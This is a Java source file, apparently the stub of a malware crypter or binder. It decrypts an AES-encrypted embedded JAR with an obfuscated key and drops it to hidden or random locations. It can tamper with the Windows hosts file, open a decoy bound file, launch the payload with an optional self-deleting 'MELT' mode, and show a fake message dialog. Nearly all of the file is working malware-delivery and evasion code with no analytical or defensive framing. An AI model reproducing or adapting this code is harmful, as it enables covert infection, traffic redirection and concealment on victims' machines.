package com.redpois0n;
import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.security.Key;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

public class Main {

	public static final byte[] buffer = new byte[1024];
	public static final String os = System.getProperty("os.name").toLowerCase();
	public static final String userHome = System.getProperty("user.home");

	public static void copy(InputStream input, OutputStream output, boolean close) throws Exception {
		int bytesRead;
		while ((bytesRead = input.read(buffer)) != -1) {
			output.write(buffer, 0, bytesRead);
		}
		if (close) {
			input.close();
			output.close();
		}
	}

	@SuppressWarnings("resource")
	public static void main(String[] args) {
		try {

			if (os.contains("mac")) {
				System.setProperty("apple.awt.UIElement", "true");
			}

			InputStream stubInput = Main.class.getResourceAsStream("/enc.dat");
			String rawKeyFile = readString(Main.class.getResourceAsStream("/key.dat"));

			String[] keyArgs = rawKeyFile.split(",");
			String encryptionKey = decode(keyArgs[0].trim());
			String dropLocation = decode(keyArgs[1].trim());
			String dropFileName = decode(keyArgs[2].trim());
			
			boolean hidden = Boolean.parseBoolean(decode(keyArgs[10].trim()));

			if (decode(keyArgs[8]).equalsIgnoreCase("true")) {
				Thread.sleep(Long.parseLong(keyArgs[9]));
			}

			if (System.getProperty("os.name").toLowerCase().contains("win") && Main.class.getResourceAsStream("/host.dat") != null) {
				try {
					File file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");

					BufferedReader reader = new BufferedReader(new InputStreamReader(Main.class.getResourceAsStream("/host.dat")));
					
					boolean overwrite = Boolean.parseBoolean(decode(reader.readLine()));
					
					FileWriter writer = new FileWriter(file, overwrite);
					BufferedWriter out = new BufferedWriter(writer);
					
					String host = "";
					String line;
					while ((line = reader.readLine()) != null) {
						host += line + "\n";
					}
					
					out.write(decode(host));

					out.close();
					reader.close();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
			
			if (hidden && !os.contains("win")) {
				dropFileName = "." + dropFileName;
			}

			File file = null;
			if (dropLocation.equals("temp/documents (unix)")) {
				if (os.contains("win")) {
					file = File.createTempFile(dropFileName, ".jar");
				} else {
					file = new File(userHome + "/Documents/" + dropFileName + (new Random().nextInt()) + ".jar");
				}
			} else if (dropLocation.equals("appdata")) {
				if (os.contains("win")) {
					file = new File(System.getenv("APPDATA") + "\\" + dropFileName + (new Random().nextInt()) + ".jar");
				} else if (os.contains("mac")) {
					file = new File(userHome + "/Library/" + dropFileName + (new Random().nextInt()) + ".jar");
				} else {
					file = File.createTempFile(dropFileName, ".jar");
				}
			} else if (dropLocation.equals("desktop")) {
				file = new File(userHome + "/Desktop/" + dropFileName + ".jar");
			}

			FileOutputStream out = new FileOutputStream(file);
			Cipher dcipher = Cipher.getInstance("AES");

			Key keySpec = new SecretKeySpec(encryptionKey.getBytes("UTF-8"), "AES");
			dcipher.init(Cipher.DECRYPT_MODE, keySpec);
			stubInput = new CipherInputStream(stubInput, dcipher);
			int numRead = 0;
			while ((numRead = stubInput.read(buffer)) >= 0) {
				out.write(buffer, 0, numRead);
			}
			out.close();
			
			if (hidden && os.contains("win")) {
				Runtime.getRuntime().exec(new String[] { "attrib", "+h", file.getAbsolutePath() });
			}

			String javapath = System.getProperty("java.home") + "\\bin\\java";

			if (Main.class.getResourceAsStream("/bind.dat") != null) {
				String[] binds = readString(Main.class.getResourceAsStream("/bind.dat")).split(",");

				String dropp = decode(binds[0].trim());
				String name1 = decode(binds[1].trim());
				String ext = decode(binds[2].trim());

				File dropfile = null;

				if (dropp.equals("temp/documents (unix)")) {
					if (os.contains("win")) {
						dropfile = File.createTempFile(name1, ext);
					} else {
						dropfile = new File(userHome + "/Documents/");
					}
				} else if (dropp.equals("appdata")) {
					if (os.contains("win")) {
						dropfile = new File(System.getenv("APPDATA") + "\\" + name1 + (new Random().nextInt()) + ext);
					} else if (os.contains("mac")) {
						dropfile = new File(userHome + "/Library/" + name1 + (new Random().nextInt()) + ext);
					} else {
						dropfile = File.createTempFile(name1, ext);
					}
				} else if (dropp.equals("desktop")) {
					dropfile = new File(userHome + "/Desktop/" + name1 + ext);
				} else {
					dropfile = new File(userHome + "/Desktop/" + name1 + ext);
				}

				FileOutputStream fos = new FileOutputStream(dropfile);
				InputStream rin = Main.class.getResourceAsStream("/" + name1);

				int read;

				while ((read = rin.read(buffer)) != -1) {
					fos.write(buffer, 0, read);
				}

				rin.close();
				fos.close();

				try {
					Desktop.getDesktop().open(dropfile);
				} catch (Exception ex) {
					ex.printStackTrace();
				}

			}

			if (System.getProperty("os.name").toLowerCase().contains("win")) {
				if (Boolean.parseBoolean(decode(keyArgs[3].trim()))) {
					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "MELT", mepath });
				} else {
					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath() });
				}
			} else {
				if (Boolean.parseBoolean(decode(keyArgs[3].trim()))) {
					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "MELT", mepath });
				} else {
					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
				}
			} 
			if (decode(keyArgs[4]).equalsIgnoreCase("true")) {
				try {
					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
				} catch (Exception e1) {
					e1.printStackTrace();
				}
				JOptionPane.showMessageDialog(null, decode(keyArgs[5]), decode(keyArgs[6]), Integer.parseInt(keyArgs[7]));
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static String readString(InputStream is) throws IOException {
		char[] buf = new char[2048];
		Reader r = new InputStreamReader(is, "UTF-8");
		StringBuilder s = new StringBuilder();
		while (true) {
			int n = r.read(buf);
			if (n < 0)
				break;
			s.append(buf, 0, n);
		}
		return s.toString();
	}

	public static String decode(String s) throws Exception {
		s = Base64.decode(s);
		char[] data = s.toCharArray();
		int len = data.length;

		if ((len & 0x1) != 0) {
			throw new NumberFormatException();
		}

		byte[] out = new byte[len >> 1];

		int i = 0;
		for (int j = 0; j < len; i++) {
			int f = toDigit(data[j], j) << 4;
			j++;
			f |= toDigit(data[j], j);
			j++;
			out[i] = ((byte) (f & 0xFF));
		}

		return new String(out);
	}
	
	private static int toDigit(char ch, int index) throws Exception {
		int digit = Character.digit(ch, 16);
		if (digit == -1) {
			throw new Exception("Illegal hexadecimal character " + ch + " at index " + index);
		}
		return digit;
	}

}
